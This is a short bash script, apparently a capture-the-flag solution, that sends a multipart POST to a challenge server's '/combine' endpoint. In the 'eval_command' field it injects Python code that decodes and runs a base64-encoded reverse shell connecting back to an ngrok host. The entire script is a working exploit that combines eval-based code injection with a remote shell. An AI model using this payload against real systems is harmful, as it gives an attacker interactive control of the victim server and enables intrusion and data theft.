#!/bin/bash

revshell=$(echo -n "sh -i >& /dev/tcp/2.tcp.ngrok.io/18745 0>&1"|base64)
payload="__import__('os').system('echo $revshell| base64 -d | bash')"
echo "payload = $payload"

curl -X POST "http://challenge.ctf.games:32742/combine" \
-H  "accept: image/png" -H  "Content-Type: multipart/form-data" \
-F "image1=@image.png;type=image/png" -F "image2=@image.png;type=image/png" \
-F "eval_command=$payload"
